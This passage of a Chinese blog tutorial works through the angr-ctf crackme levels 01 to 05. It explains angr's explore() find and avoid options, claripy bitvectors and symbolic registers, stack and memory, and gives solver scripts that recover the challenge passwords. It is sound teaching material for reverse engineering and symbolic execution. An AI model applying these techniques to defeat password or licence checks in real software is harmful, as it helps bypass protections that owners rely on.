src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" alt="image.png"></p><p>而 <code>avoid_me()</code>会将变量 <code>should_succeed</code> 置 0，这意味着我们在执行时应该避免调用了该函数的路径：</p><p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" alt="image.png"></p><p>如果硬逆的话逻辑还是比较复杂的（<del>反正👴肯定不愿意手动逆</del>），于是我们还是可以使用 angr 进行求解，目标路径还是输出 <code>&quot;Good Job.&quot;</code>，不过这一题我们多了一个约束：避开 <code>avoid_me()</code> 函数的执行</p><p>如果我们不避开这个近乎无处不在的 <code>avoid_me()</code> 函数，则会造成<strong>路径爆炸</strong>（Path Explosion），从而大幅度增加求解时间，因此我们需要在路径约束的求解上避开该函数</p><h3 id="simgr-explore-的基本用法"><a href="#simgr-explore-的基本用法" class="headerlink" title="simgr.explore() 的基本用法"></a>simgr.explore() 的基本用法</h3><p>我们通常使用模拟器的 <code>.explore()</code> 方法来进行路径探索，传入的默认参数为 <code>find</code>——一个&#x2F;一组令模拟器终止运行的地址，符合的执行状态结果会被放到 <code>.found</code> 列表中</p><p>但除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的地址，当一个状态执行到这样的地址时，其会被放在 <code>.avoided</code> 列表中并不再往后执行</p><p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的解状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的解状态</p><h3 id="FINAL-EXPLOUT"><a href="#FINAL-EXPLOUT" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>现在我们知道该如何进行路径避免了，于是最后的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是一下子就出来了：</p><p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" alt="image.png"></p><blockquote><p>笔者实际跑了一下不避开该约束的求解场景，巨<del>™</del>慢，<del>直接把👴の阿里☁学生🐓给炸了</del></p></blockquote><h2 id="02-angr-find-condition：自定义搜索条件"><a href="#02-angr-find-condition：自定义搜索条件" class="headerlink" title="02_angr_find_condition：自定义搜索条件"></a>02_angr_find_condition：自定义搜索条件</h2><p>惯例地拖入 IDA，<strong>似乎</strong>逻辑和第一道题差不多，<code>complex_function()</code> 也没啥改变这里就不贴了：</p><p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" alt="image.png"></p><p>但一看汇编就流汗黄豆了，<strong>因为实际上存在非常多的伪路径</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" alt="image.png"></p><p><strong>并且有着非常多的输出 Good Job 字符串的基本块</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" alt="image.png"></p><p>如果你只是简单看了一下然后随便选了一个（比如说看到第一个直接选）扔进 angr 里求解，<strong>那就寄了</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" alt="image.png"></p><p>怎么办呢？第一种方法是手动再分析一下这些伪路径，但是这就不符合我们使用 angr 的自动求解思想了：）因此我们需要寻找一种能够避开这些路径的方法</p><h3 id="simgr-explore-的扩展用法"><a href="#simgr-explore-的扩展用法" class="headerlink" title="simgr.explore() 的扩展用法"></a>simgr.explore() 的扩展用法</h3><p>实际上 <code>explore()</code> 的参数 <code>find</code> 与 <code>avoid</code> 除了可以是目标地址外，<strong>还可以是自定义函数，参数为模拟状态，返回值为判定条件的布尔值</strong></p><ul><li>即我们可以编写自定义函数来判断一个状态是否是我们应当要寻找的状态</li></ul><p>例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOUT-1"><a href="#FINAL-EXPLOUT-1" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>那么解题思路就清晰了，我们将求解的目标路径设为输出 <code>&quot;Good Job.&quot;</code> 字符串、avoid 路径设为输出 <code>&quot;Try again.&quot;</code> 字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" alt="image.png"></p><h1 id="0x02-angr-ctf：符号化"><a href="#0x02-angr-ctf：符号化" class="headerlink" title="0x02. angr-ctf：符号化"></a>0x02. angr-ctf：符号化</h1><h2 id="03-angr-symbolic-registers：符号化寄存器"><a href="#03-angr-symbolic-registers：符号化寄存器" class="headerlink" title="03_angr_symbolic_registers：符号化寄存器"></a>03_angr_symbolic_registers：符号化寄存器</h2><p>惯例拖进 IDA，大概是读入输入后用三个函数简单算一下，输入参数是 <code>eax、ebx、edx</code> 寄存器的值，三个结果都为 0 就🆗了：</p><p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" alt="image.png"></p><p>在 <code>get_user_input()</code> 里会分别读三个数到 <code>eax、ebx、edx</code> 寄存器中：</p><p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" alt="image.png"></p><blockquote><p>然后你会发现反编译的结果就是个🐓⑧…👴刚看反编译的伪代码还想了半天为啥要多读两个数然后扔掉</p><p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" alt="image.png"></p></blockquote><p>然后你会发现用上一题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic registers</code>，这意味着<strong>本题我们应当将这三个寄存器设置为符号变量来进行约束求解</strong></p><h3 id="Claripy-angr-的求解引擎"><a href="#Claripy-angr-的求解引擎" class="headerlink" title="Claripy - angr 的求解引擎"></a>Claripy - angr 的求解引擎</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p><h4 id="bitvector-位向量"><a href="#bitvector-位向量" class="headerlink" title="bitvector - 位向量"></a>bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一组位</strong> （a sequence of bits）</p><p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0填充）后进行运算，需要注意的是位向量的运算同样存在溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure><p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure><p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure><p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><h3 id="state-solver-状态的求解接口"><a href="#state-solver-状态的求解接口" class="headerlink" title="state.solver - 状态的求解接口"></a>state.solver - 状态的求解接口</h3><p>前面讲到 <code>state.solver</code> 提供了一些基于状态的求解接口，例如 solver 同样有创建位向量的 <code>.BVV()</code> 与 <code>.BVS()</code> 接口</p><p>在需要对位向量符号进行具体值的求解时，我们可以先将位向量符号存放到状态的内存&#x2F;寄存器中，之后用 simgr 探索到对应的状态后，再使用 <code>state.solver.eval()</code> 成员函数来获取对应位向量在当前状态下的值，以下是一个简单的🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们只需要创建一个从 <code>get_user_input()</code> 之后开始执行的空白的状态，并将对应的寄存器设置为位向量符号，之后在求解状态使用 <code>.solver.eval()</code> 来求解即可</p><p>最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>很快啊，啪的一下就出来了.mkv</p><p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" alt="image.png"></p><h2 id="04-angr-symbolic-stack：符号化栈"><a href="#04-angr-symbolic-stack：符号化栈" class="headerlink" title="04_angr_symbolic_stack：符号化栈"></a>04_angr_symbolic_stack：符号化栈</h2><p>还是惯例拖入 IDA，主要的处理逻辑在 <code>handle_user()</code> 当中，还是读入两个数之后扔给不同的 complex 函数处理：</p><p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" alt="image.png"></p><p>然后你会发现用上上题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic stack</code>，这意味着<strong>本题我们应当将栈设置为符号变量来进行约束求解</strong></p><p>那么我们该怎么做呢？重新来看 <code>handler_user()</code> 的汇编代码，两个待求解变量都是位于栈上的固定位置：</p><p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" alt="image.png"></p><p>那么我们还是可以将初始状态设置为从读入输入后开始的空白状态，之后创建两个位向量符号，设置好 ebp 和 esp 的相对位置后使用  <code>state.stack_push(val)</code> 来<strong>手动地将符号变量推到栈上</strong>，最后的求解路径还是设为输出 <code>&quot;Good Job.&quot;</code> 的地址即可，这里需要注意仔细计算变量在栈上的位置</p><p>求解脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" alt="image.png"></p><h2 id="05-angr-symbolic-memory：符号化内存"><a href="#05-angr-symbolic-memory：符号化内存" class="headerlink" title="05_angr_symbolic_memory：符号化内存"></a>05_angr_symbolic_memory：符号化内存</h2><p>还是惯例地拖入 IDA，这一次是读入四个 8 字节到一块连续的 32 字节内存上，其中 <code>user_input</code> 的地址便是 <code>0x82F48A0</code>，之后调用 <code>complex_function()</code> 逐字符处理这 32 字节后与特定字符串进行对比：</p><p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" alt="image.png"></p><p>那么从题目名称我们不难看出<strong>这一次我们应当要将内存作为符号变量进行约束求解</strong></p><h3 id="state-的内存操作"><a href="#state-的内存操作" class="headerlink" title="state 的内存操作"></a>state 的内存操作</h3><p>前面讲到，对于一个状态的内存，我们可以使用 <code>state.memory</code> 的对应接口进行操作：</p><ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul><p>需要注意的是如果要储存具体值，则需要通过 <code>endness</code> 参数指定大小端序</p><h3 id="FINAL-EXPLOIT-2"><a href="#FINAL-EXPLOIT-2" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题还是创建对应大小的 BVS 后 explore() 即可，需要注意的是在获取最后求解的值时别忘了指定参数 <code>cast_to=bytes</code> 以获得字符输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    